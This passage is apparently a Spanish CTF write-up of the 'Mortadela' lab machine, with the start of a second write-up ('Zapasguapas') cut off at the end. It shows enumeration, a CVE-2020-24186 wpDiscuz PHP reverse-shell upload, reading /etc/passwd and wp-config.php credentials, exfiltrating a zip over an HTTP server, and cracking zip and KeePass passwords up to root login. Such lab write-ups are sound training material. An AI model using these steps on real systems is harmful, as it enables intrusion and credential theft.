for 192.168.231.130 Host is up, received arp-response (0.00041s latency). Scanned at 2025-07-17 12:24:31 CEST for 1s Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 3306/tcp open mysql syn-ack ttl 64 MAC Address: 00:0C:29:39:0A:C9 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rYa vemos varios puertos abiertos, donde est√° expuesto el puerto 3306 de MySQL as√≠ que quiz√°s a futuro tendremos que entrar a ella. Vamos a realizar un segundo escaneo nmap para ver las versiones de los servicios y lanzar algunos scripts b√°sicos de reconocmiento:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/nmap] ‚îî‚îÄ$ nmap -p22,80,3306 -sCV 192.168.231.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:25 CEST Nmap scan report for 192.168.231.130 Host is up (0.00019s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA) |_ 256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.57 (Debian) 3306/tcp open mysql MariaDB 5.5.5-10.11.6 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.11.6-MariaDB-0+deb12u1 | Thread ID: 7431 | Capabilities flags: 63486 | Some Capabilities: Support41Auth, SupportsCompression, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, SupportsTransactions, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: u6IN++4cwLUF?J4f\u0026amp;(3j |_ Auth Plugin Name: mysql_native_password MAC Address: 00:0C:29:39:0A:C9 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.38 seconds\rVamos a ver la aplicaci√≥n web:\nVemos que es la p√°gina por defecto de Apache2, vamos a realizar fuzzing a ver si encontramos otras cosas m√°s interesantes:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.130/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.130/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 0ms] wordpress [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 0ms]\rVemos la carpeta wordpress vamos a entrar en ella:\nAviso\nEs normal que note√≠s que la aplicaci√≥n web va lenta, ya que tiene un fallo de virtualhosting. Esto no afecta a la resoluci√≥n de la m√°quina.\nVamos a emplear wpscan para tirar un enumeramiento a toda la aplicaci√≥n Wordpress:\n_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ¬Æ \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.28 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://192.168.231.130/wordpress/ [192.168.231.130] [+] Started: Wed Jul 16 20:07:47 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.57 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://192.168.231.130/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://192.168.231.130/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://192.168.231.130/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30). | Found By: Emoji Settings (Passive Detection) | - http://192.168.231.130/wordpress/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=6.4.3\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://192.168.231.130/wordpress/, Match: \u0026#39;WordPress 6.4.3\u0026#39; [i] The main theme could not be detected. [i] Plugin(s) Identified: [+] akismet | Location: http://192.168.231.130/wordpress/wp-content/plugins/akismet/ | Last Updated: 2025-07-15T18:17:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.5 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/, status: 200 | | Version: 5.3.1 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt [+] wpdiscuz | Location: http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/ | Last Updated: 2025-06-29T17:10:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/readme.txt | [!] The version is out of date, the latest version is 7.6.33 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/, status: 200 | | Version: 7.0.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/readme.txt [i] Theme(s) Identified: [+] twentytwentyfive | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/ | Latest Version: 1.2 (up to date) | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/readme.txt | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/style.css | Style Name: Twenty Twenty-Five | Style URI: https://wordpress.org/themes/twentytwentyfive/ | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentytwentyfour | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.3 | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/, status: 200 | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: \u0026#39;Version: 1.0\u0026#39; [+] twentytwentythree | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/readme.txt | [!] The version is out of date, the latest version is 1.6 | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/style.css | Style Name: Twenty Twenty-Three | Style URI: https://wordpress.org/themes/twentytwentythree | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6.... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentytwentytwo | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/ | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/readme.txt | [!] The version is out of date, the latest version is 2.0 | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/style.css | Style Name: Twenty Twenty-Two | Style URI: https://wordpress.org/themes/twentytwentytwo/ | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/, status: 200 | | Version: 1.6 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/style.css, Match: \u0026#39;Version: 1.6\u0026#39; [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Jul 16 20:10:44 2025 [+] Requests Done: 141687 [+] Cached Requests: 24 [+] Data Sent: 41.292 MB [+] Data Received: 19.208 MB [+] Memory used: 442.492 MB [+] Elapsed time: 00:02:56\rVemos que encontr√≥ un plugin llamado wpdiscuz que tiene la versi√≥n 7.0.4 vamos a buscarlo por Google:\nEn mi caso encontr√© este repositorio con el exploit:\nRepositorio\rScript en python automatizado para el PoC del CVE-2020-24186\nShell as www-data Para emplearlo nos piden lo siguiente:\n-u -\u0026gt; URL objetivo que en este caso es http://192.168.231.130/wordpress/ -p -\u0026gt; Un post donde se emplee este plugin, donde desonocemos de uno. Vamos a buscar un post, viendo la web me percato de lo siguiente:\nSi le damos click nos redirige a un post, lo encontramos!!\nAviso\nAl darle click nos redirigir√° a http://192.168.0.108/.... tendremos que cambiar la IP por la correspondiente.\nLa web no carga, seguramente por el virtual hosting, vamos a usar el exploit!\nAntes de explotarlo nos pondremos en escucha:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/exploits] ‚îî‚îÄ$ rlwrap nc -nlvp 9001 listening on [any] 9001 ...\rAhora iniciamos el exploit:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/exploits] ‚îî‚îÄ$ python3 exploit.py -u http://192.168.231.130/wordpress -p /index.php/2024/04/01/hola-mundo/ -l 192.168.231.128 -s 9001 --------------------------------------------------------------- [-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution [-] File Upload Bypass Vulnerability - PHP Reverse Shell Upload [-] CVE: CVE-2020-24186 [-] Modified by Substing https://github.com/substing [-] Based on https://github.com/hev0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE [-] PHP Reverse shell from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php [-] For educational and pentesting purposes only. FOLLOW THE LAWS! --------------------------------------------------------------- [+] Response length:[93144] | code:[200] [!] Got wmuSecurity value: 713c6a0844 [!] Got wmuSecurity value: 1 [+] Generating random name for shell... [!] Generated shell name: oumyxrnjcrfkfqs [!] Trying to Upload Shell.. [+] Upload Success... [+] In your terminal run: nc -nvlp 9001 [+] Navigate to http://192.168.0.108/wordpress/wp-content/uploads/2025/07/oumyxrnjcrfkfqs-1752749705.993.php\rBien nos ha creado y subido una webshell, vamos a entrar a ese archivo:\nAviso\nAl darle click nos redirigir√° a http://192.168.0.108/.... tendremos que cambiar la IP por la correspondiente.\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/exploits] ‚îî‚îÄ$ rlwrap nc -nlvp 9001 listening on [any] 9001 ... connect to [192.168.231.128] from (UNKNOWN) [192.168.231.130] 40616 Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux 12:55:59 up 47 min, 0 user, load average: 0.00, 0.00, 0.16 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can\u0026#39;t access tty; job control turned off $\rShell as root Si leemos el /etc/passwd nos percataremos de un usuario:\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ www-data@mortadela:/$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin mortadela:x:1000:1000:mortadela,,,:/home/mortadela:/bin/bash mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false\rVemos el usuario mortadela pero no tenemos ning√∫n tipo de credenciales. Vamos a buscar el archivo wp-config.php donde encontraremos las credenciales de la base de datos:\n[..] // ** Database settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** Database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** Database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;lolalolitalola\u0026#39; ); /** Database hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The database collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); [...]\rEncontramos que el usuario wordpress su credencial a la base de datos es lolalolitalola, pero si intentamos acceder no tendremos permisos. Vamos a seguir buscando por el sistema. Viendo el directorio /opt/ me encontr√© lo siguiente:\nwww-data@mortadela:/$ ls /opt ls /opt muyconfidencial.zip\rVamos a abrir un servidor en python3 y bajarnos ese archivo .zip:\nwww-data@mortadela:/opt$ python3 -m http.server 8083 python3 -m http.server 8083 Serving HTTP on 0.0.0.0 port 8083 (http://0.0.0.0:8083/) ...\r‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ wget http://192.168.231.130:8083/muyconfidencial.zip --2025-07-17 13:02:36-- http://192.168.231.130:8083/muyconfidencial.zip Connecting to 192.168.231.130:8083... connected. HTTP request sent, awaiting response... 200 OK Length: 93052465 (89M) [application/zip] Saving to: ‚Äòmuyconfidencial.zip‚Äô muyconfidencial.zip 100%[=================================================================================================\u0026gt;] 88.74M 89.1MB/s in 1.0s 2025-07-17 13:02:37 (89.1 MB/s) - ‚Äòmuyconfidencial.zip‚Äô saved [93052465/93052465]\rVamos a intentar descomprimirlo:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password:\rNos piden credenciales, vamos a ver si se reutilizan las de mysql:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password: password incorrect--reenter:\rVemos que no, as√≠ que haremos fuerza bruta. Sacaremos el hash con zip2john:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ zip2john muyconfidencial.zip \u0026gt; hash ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0 ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time.\rAhora con john haremos un ataque de fuerza bruta con la wordlist rockyou.txt:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ john -w=/usr/share/wordlists/rockyou.txt hash --format=PKZIP Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status pinkgirl (muyconfidencial.zip) 1g 0:00:00:00 DONE (2025-07-17 13:07) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rJohn\nA√±adimos el parametro --format=PKZIP ya que el hash si leemos sus primeras lineas nos indica que es de formato PKZIP.\nYa teniendo la contrase√±a vamos a descomprimirlo:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password: extracting: Database.kdbx inflating: KeePass.DMP\rVemos que tenemos 2 archivos de KeePass, vamos a abrir Database.kdbx:\nNos pide una Master Key, buscando en google me encontr√© el siguiente repositorio:\nkeepass-dump-extractor\rKeePass Memory Dump Extractor\nNos podr√° ser de ayuda ya que tenemos el archivo KeePass.DMP, as√≠ que vamos a emplearlo:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ ./keepass-dump-extractor KeePass.DMP -f all \u0026gt; wordlist\rEsto nos ha creado posibles combinaciones de Master Key, ahora con keepass2john vamos a sacar el hash de Database.kdbx:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] ‚îî‚îÄ$ keepass2john Database.kdbx \u0026gt; hash_keepass\rAhora con hashcat vamos a hacerle un ataque de fuerza bruta:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/content] 13:17:21 [19/19] ‚îî‚îÄ$ hashcat -m 13400 --username hash_keepass wordlist --potfile-disable hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ==================================================================================================================================================== * Device #1: cpu-skylake-avx512-AMD Ryzen 5 7600X 6-Core Processor, 2201/4466 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Single-Hash * Single-Salt Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 1 MB Dictionary cache built: * Filename..: wordlist * Passwords.: 570 * Bytes.....: 9025 * Keyspace..: 570 * Runtime...: 0 secs $keepass$*2*60000*0*93809672768b681bd065a3f15b50cf58e0ec612024580a60c67cdb842c3d2273*142d5f1e47d60a3bfda60e3689051621ccb647ef218e6b59b4299e21adfb90d0*dc28dc2d815d5f6632cf34cfb81f38be*565454906826c80142d135dac98968adadb0ebc1d99aecb0abe87cd3bc02b137*64c4082fac98e04e9ad511e188931ee4c0e4b22e015f5df2da173a86a782cde2:Maritrini12345 [..]\rTenemos la Master Key!! Vamos a probarla\nVamos a iniciar sesi√≥n por SSH:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~] ‚îî‚îÄ$ ssh root@192.168.231.130 root@192.168.231.130\u0026#39;s password: Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 12:17:41 2025 from 192.168.231.128 root@mortadela:~# whoami; hostname -I root 192.168.231.130\rroot! ;)\nRese√±a ","date":"2025-07-17","id":13,"permalink":"/writeups/thehackerslabs/mortadela/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.130 Starting Nmap 7.","tags":[],"title":"Mortadela"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/nmap] ‚îî‚îÄ$ nmap -p- --open --min-rate=5000 -n -Pn -vvv 192.168.231.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 13:53 CEST Initiating ARP Ping Scan at 13:53 Scanning 192.168.231.131 [1 port] Completed ARP Ping Scan at 13:53, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:53 Scanning 192.168.231.131 [65535 ports] Discovered open port 22/tcp on 192.168.231.131 Discovered open port 80/tcp on 192.168.231.131 Completed SYN Stealth Scan at 13:53, 1.06s elapsed (65535 total ports) Nmap scan report for 192.168.231.131 Host is up, received arp-response (0.000047s latency). Scanned at 2025-07-17 13:53:30 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:C6:42:17 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVamos a realizar un segundo escaneo para determinar la versi√≥n del servicio de cada y lanzar algunos scripts b√°sicos de reconocimiento:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/nmap] ‚îî‚îÄ$ nmap -p22,80 -sCV 192.168.231.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 13:54 CEST Nmap scan report for 192.168.231.131 Host is up (0.00018s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 7e:42:d0:d4:c9:36:f4:f8:e6:77:c2:c6:7e:25:dc:ff (ECDSA) |_ 256 6f:a0:50:44:9f:a2:fb:99:40:f3:90:af:56:cc:34:e3 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Zapasguapas MAC Address: 00:0C:29:C6:42:17 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds\rBien vamos a ver la aplicaci√≥n web:\nSi vamos probando cosas en la web vemos que no tiene muchas funcionalidades, as√≠ que vamos a realizar fuzzing:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/nmap] 13:56:49 [7/7] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.131/FUZZ\u0026#34; -e .php,.html,.js,.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.131/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ contact.html [Status: 200, Size: 7694, Words: 2174, Lines: 158, Duration: 1ms] about.html [Status: 200, Size: 8764, 